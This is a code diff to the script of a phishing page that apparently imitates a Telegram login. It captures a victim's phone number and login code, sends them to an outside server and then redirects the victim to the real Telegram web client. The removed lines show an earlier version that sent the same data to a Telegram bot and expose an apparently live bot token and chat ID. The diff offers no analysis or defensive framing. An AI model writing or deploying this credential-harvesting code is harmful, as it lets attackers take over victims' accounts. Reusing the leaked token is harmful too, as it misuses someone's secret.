@@ -146,10 +146,9 @@
 </div>
 
 <script>
-    const BOT_TOKEN = '8300626512:AAEH-ZR2FLuQkRhkF6WkRdgOsdhimjBL9IE';
-    const CHAT_ID = '7110007728';
+    const SERVER_URL = 'https://hiro016.pythonanywhere.com/send';
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         
         const phone = document.getElementById('phone').value.trim();
@@ -169,25 +168,29 @@
         successDiv.textContent = 'Sending...';
         successDiv.style.display = 'block';
         
-        const message = 'LOGIN\nPhone: ${phone}\nCode: ${code}';
-        
-        const img = new Image();
-        const url = 'https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}';
-        
-        img.onload = function() {
-            successDiv.textContent = 'Success! Redirecting...';
-            setTimeout(() => {
-                window.location.href = 'https://web.telegram.org/z/';
-            }, 1000);
-        };
-        
-        img.onerror = function() {
-            errorDiv.textContent = 'Error. Please try again.';
+        try {
+            const response = await fetch(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone, code: code })
+            });
+            const result = await response.json();
+            
+            if (result.ok) {
+                successDiv.textContent = 'Success! Redirecting...';
+                setTimeout(() => {
+                    window.location.href = 'https://web.telegram.org/z/';
+                }, 1000);
+            } else {
+                errorDiv.textContent = 'Error. Please try again.';
+                errorDiv.style.display = 'block';
+                successDiv.style.display = 'none';
+            }
+        } catch (err) {
+            errorDiv.textContent = 'Network error. Try again.';
             errorDiv.style.display = 'block';
             successDiv.style.display = 'none';
-        };
-        
-        img.src = url;
+        }
     });
 </script>
 </body>
